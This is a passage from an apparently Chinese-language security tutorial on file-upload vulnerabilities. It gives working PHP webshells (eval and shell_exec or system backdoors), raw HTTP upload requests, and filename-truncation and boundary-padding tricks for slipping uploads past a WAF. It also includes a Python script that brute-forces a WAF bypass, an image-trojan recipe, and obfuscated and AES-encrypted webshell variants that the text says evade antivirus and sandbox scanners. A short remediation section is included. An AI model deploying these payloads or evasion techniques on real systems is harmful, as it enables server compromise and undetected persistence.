class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">01</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf,bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">592</span></span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure><h3 id="5-5-4-multipart-form-data与boundary之间插入垃圾数据"><a href="#5-5-4-multipart-form-data与boundary之间插入垃圾数据" class="headerlink" title="5.5.4 multipart&#x2F;form-data与boundary之间插入垃圾数据"></a>5.5.4 multipart&#x2F;form-data与boundary之间插入垃圾数据</h3><p>刚才讲到过<code>multipart/form-data</code>与<code>boundary</code>之间可以插入任何数据，那么就可以在<code>multipart/form-data</code>与<code>boundary</code>之间加入大量垃圾数据。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">01</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9 boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">319</span></span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure><h2 id="5-6-数据截断"><a href="#5-6-数据截断" class="headerlink" title="5.6 数据截断"></a>5.6 数据截断</h2><h3 id="5-6-1-回车换行截断"><a href="#5-6-1-回车换行截断" class="headerlink" title="5.6.1 回车换行截断"></a>5.6.1 回车换行截断</h3><p>POST请求体是可以换行的，但是中间不得有空行。若WAF匹配文件名到换行截止，则可以绕过。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="keyword">for</span></span><br><span class="line">m-data; name=<span class="string">&quot;upload_</span></span><br><span class="line"><span class="string">file&quot;</span>; fi</span><br><span class="line">le</span><br><span class="line">name=<span class="string">&quot;sh</span></span><br><span class="line"><span class="string">ell.p</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">p&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-6-2-分号截断"><a href="#5-6-2-分号截断" class="headerlink" title="5.6.2 分号截断"></a>5.6.2 分号截断</h3><p>若WAF匹配文件名到分号截止，则可以绕过。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg;.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-6-3-引号截断"><a href="#5-6-3-引号截断" class="headerlink" title="5.6.3 引号截断"></a>5.6.3 引号截断</h3><p>php&lt;5.3 单双引号截断特性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&#x27;.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>.<span class="property">php</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-6-4-00截断"><a href="#5-6-4-00截断" class="headerlink" title="5.6.4 00截断"></a>5.6.4 00截断</h3><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，所以当url中出现%00时就会认为读取已结束。这里使用<code>[0x00]</code>代替16进制的00字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php[0x00].jpg&quot;</span></span><br></pre></td></tr></table></figure><h2 id="5-7-安全狗绕过"><a href="#5-7-安全狗绕过" class="headerlink" title="5.7 安全狗绕过"></a>5.7 安全狗绕过</h2><p>WAF：网站安全狗（Apache版）v4.0.3025</p><p>干货 | 最全的文件上传漏洞之WAF拦截绕过总结：<a href="https://cloud.tencent.com/developer/article/1944142">https://cloud.tencent.com/developer/article/1944142</a></p><h3 id="5-7-1-编写脚本利用数据溢出绕过"><a href="#5-7-1-编写脚本利用数据溢出绕过" class="headerlink" title="5.7.1 编写脚本利用数据溢出绕过"></a>5.7.1 编写脚本利用数据溢出绕过</h3><p>在boundary字符串后加入大量垃圾数据。使用python2.7编写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://hackrock.com:813/Pass-01/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">    length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">        random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">8000</span>,<span class="number">50</span>):</span><br><span class="line">    stri = generate_random_str(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;hackrock.com:813&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://hackrock.com:813/Pass-01/index.php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;multipart/form-data; boundary=----&quot;</span> + stri</span><br><span class="line">        &#125;</span><br><span class="line">        payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri +<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">            Content-Type: image/png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            上传</span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri + <span class="string">&quot;&quot;&quot;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        response=requests.post(url=url,headers=headers,data=payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">        result = response.content</span><br><span class="line">        <span class="built_in">print</span> result</span><br><span class="line">        <span class="built_in">print</span> stri</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        <span class="comment">#print headers</span></span><br><span class="line">        <span class="keyword">if</span> result.count(<span class="string">&#x27;上传&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Length is : %s &quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;.&quot;</span></span><br></pre></td></tr></table></figure><p>测试长度为3710个字符。</p><p>将构造好的数据包放进Burp尝试发送。</p><h3 id="5-7-2-利用00截断绕过"><a href="#5-7-2-利用00截断绕过" class="headerlink" title="5.7.2 利用00截断绕过"></a>5.7.2 利用00截断绕过</h3><p>上传文件，使用Burp抓包，将filename的值改为：<code>shell.php;.jpg</code>。</p><p>然后打开hex,（分号的16进制为0x3b）修改16进制内容，把3b改成00。</p><p>发送数据，成功绕过。</p><h1 id="6-安全修复"><a href="#6-安全修复" class="headerlink" title="6 安全修复"></a>6 安全修复</h1><p>后端验证：针对后端验证的可以采用通过服务器进行验证。</p><p>后缀检测：利用黑白名单进行过滤，当然最好是使用白名单，黑名单有时候总归会存在一些未想到的后缀，而白名单就相对简单一点，只需要想放通哪些后缀即可，而且防范更好一些。</p><p>上传目录：对上传文件到的目录可以设置一个不可执行的权限。</p><p>文件名：针对文件名可以自定义一些随机数以及一些其他的内容进行二次修改，从而改变文件的名称。</p><p>内容检测：可以使用文件头，完整性检测，最好能够对内容的数据进行判断是否存在一些webxshll类似的代码，若出现这类代码，直接删除。</p><h1 id="7-图片马制作方法"><a href="#7-图片马制作方法" class="headerlink" title="7 图片马制作方法"></a>7 图片马制作方法</h1><p><strong>方法一：</strong>CMD方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b test.png+1.php muma.png</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong>直接使用工具增加备注写入一句话木马。</p><blockquote><p>edjpgcom.exe</p></blockquote><h1 id="8-Webshell免杀"><a href="#8-Webshell免杀" class="headerlink" title="8 Webshell免杀"></a>8 Webshell免杀</h1><p>webshell通常可分为一句话木马，小马，大马，内存马。</p><ol><li><p>一句话木马是最简单也是最常见的webshell形式，这种木马体积小，隐蔽较强，免杀相对容易；</p></li><li><p>小马是功能较为简单的Webshell，但比一句话木马稍复杂，可能会包含一个简单的文件管理界面或命令执行功能；</p></li><li><p>大马是功能全面的webshell，通常带有图形用户界面，提供文件管理、数据库操作、命令执行等多种功能，比如常用的蚁剑，冰蝎，哥斯拉等，大马由于功能复杂，在做免杀时一般需要将大马伪装成合法管理工具，分解成多个独立模块，分别加载，降低单点检测风险；</p></li><li><p>内存马是一种驻留在内存中的恶意代码，通常通过修改服务器进程的内存空间来执行，极难被发现和删除。与一般的webshell木马不同，内存马免杀一般需要采用内存隐藏，动态注入等方式，尽可能的隐藏恶意代码在内存中的存在，降低被持久发现的风险。</p></li></ol><h2 id="8-1-可变变量绕过"><a href="#8-1-可变变量绕过" class="headerlink" title="8.1 可变变量绕过"></a>8.1 可变变量绕过</h2><p>一些安全检测机制会直接扫描代码中是否包含敏感函数调用，对此可以把敏感的函数名隐藏在可变变量中。</p><p>下面通过把 shell_exec 隐藏到可变变量中实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$v</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line"><span class="variable">$$v</span>=<span class="string">&quot;shell_exec&quot;</span>; <span class="comment">#相当于是 $x=&quot;shell_exec&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 河马查杀能检测出来。</p><p>单纯的可变变量特性一般过不了杀软，该方法通常需要和其他绕过方法配合使用。</p><h2 id="8-2-各种加密绕过"><a href="#8-2-各种加密绕过" class="headerlink" title="8.2 各种加密绕过"></a>8.2 各种加密绕过</h2><p>将特征函数先用某种加密方式加密，再解密。</p><p>比如简单的base64加密：</p><p>在木马中把密文解密后调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$v</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;c2hlbGxfZXhlYw==&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$v</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单的加密过不了杀软，还是能被检测出来。</p><p>但是，可以考虑和代码混淆一起使用。在代码中加入与主要功能无关的代码，可以干扰分析工具和反病毒软件的检测，提高隐蔽性。</p><p>在此基础上，增加safe_waf和Safe两个无用函数并调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_waf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data1</span> = <span class="string">&quot;1qazxsw23edcvfr45tgb&quot;</span>;</span><br><span class="line">    <span class="variable">$data2</span> = <span class="string">&quot;1qazXSW@3edcVFR<span class="subst">$6yhn</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$data3</span> = <span class="string">&quot;!QAZxsw2#EDCvfr4%TGB&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data1</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$data1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$a_safe</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">10</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$a_safe</span>[] = <span class="title function_ invoke__">md5</span>(<span class="variable">$j</span>.<span class="variable">$data2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Safe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$t</span> = <span class="string">&quot;1qazxsw23edcvfr45tgb&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DD</span>(<span class="params"><span class="variable">$Data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">safe_waf</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">DD</span>(<span class="string">&quot;c2hlbGxfZXhlYw==&quot;</span>)(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">Safe</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改后可以过通过河马。然而可以被云沙箱检测出来（<a href="https://sandbox.dbappsecurity.com.cn/">安恒云沙箱</a>）。</p><p>此外，加密函数可以考虑采用更复杂的加密，比如<strong>AES加密</strong>。</p><p>首先写一个加密代码，在本地生成一个key和密文：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateKey</span>(<span class="params"><span class="variable">$length</span> = <span class="number">32</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="variable">$length</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="string">&#x27;aes-256-cbc&#x27;</span>));</span><br><span class="line">    <span class="variable">$ciphertext</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$ciphertext</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">generateKey</span>();</span><br><span class="line"><span class="variable">$original_data</span> = <span class="string">&quot;shell_exec&quot;</span>;</span><br><span class="line"><span class="variable">$encrypted_data</span> = <span class="title function_ invoke__">encrypt</span>(<span class="variable">$original_data</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;key = &quot;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$key</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Encrypted Data: &quot;</span> . <span class="variable">$encrypted_data</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = 88c266a678f21d1713e14b032e16475897290d86a692f818bbd89234d7757ec4</span><br><span class="line">Encrypted Data: xlri1KQnFm7Z7osHErvWBZn9tFtE5uSX9gZ1yNSef2s=</span><br></pre></td></tr></table></figure><p>然后在木马中传入密文和key，并写一个解码函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DD</span>(<span class="params"><span class="variable">$Data</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Data</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="string">&#x27;aes-256-cbc&#x27;</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$c</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$k</span>), OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">DD</span>(<span class="string">&quot;xlri1KQnFm7Z7osHErvWBZn9tFtE5uSX9gZ1yNSef2s=&quot;</span>,<span class="string">&quot;88c266a678f21d1713e14b032e16475897290d86a692f818bbd89234d7757ec4&quot;</span>)(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>该样例可以逃过安恒的沙箱查杀。试一试河马和VT，也可以通过。</p><h2 id="8-3-传参绕过"><a href="#8-3-传参绕过" class="headerlink" title="8.3 传参绕过"></a>8.3 传参绕过</h2><p>可以把传入的函数名写在请求中获取，通过将函数名动态地从外部传递。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$v</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时可以把func传参为system，把xxx作为命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.*/test.php?func=system&amp;xxx=echo hack</span><br></pre></td></tr></table></figure><p>该方法可以与回调函数结合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$v</span>);</span><br><span class="line"><span 